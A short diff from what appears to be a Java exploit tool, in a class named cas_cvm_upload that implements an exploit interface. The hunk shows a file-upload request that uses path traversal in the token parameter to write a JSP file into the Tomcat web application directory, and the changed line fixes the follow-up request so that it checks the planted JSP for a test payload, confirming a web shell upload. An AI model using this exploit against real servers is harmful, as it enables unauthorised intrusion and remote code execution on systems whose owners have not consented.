@@ -56,7 +56,7 @@ public class cas_cvm_upload implements Exploitlnterface {
 
         Response post = HttpTools.post(url + "/cas/fileUpload/upload?token=/../../../../../var/lib/tomcat8/webapps/cas/js/lib/buttons/nishizhu.jsp&name=222", payload, head, "utf-8");
 
-        Response response = HttpTools.get(url + "/cas/js/lib/buttons/nishizhu.txt", new HashMap<String, String>(), "utf-8");
+        Response response = HttpTools.get(url + "/cas/js/lib/buttons/nishizhu.jsp", new HashMap<String, String>(), "utf-8");
         if(response.getCode() == 200 && response.getText().contains(shell.test_payload)){
             Platform.runLater(() -> {
                 textArea.appendText(
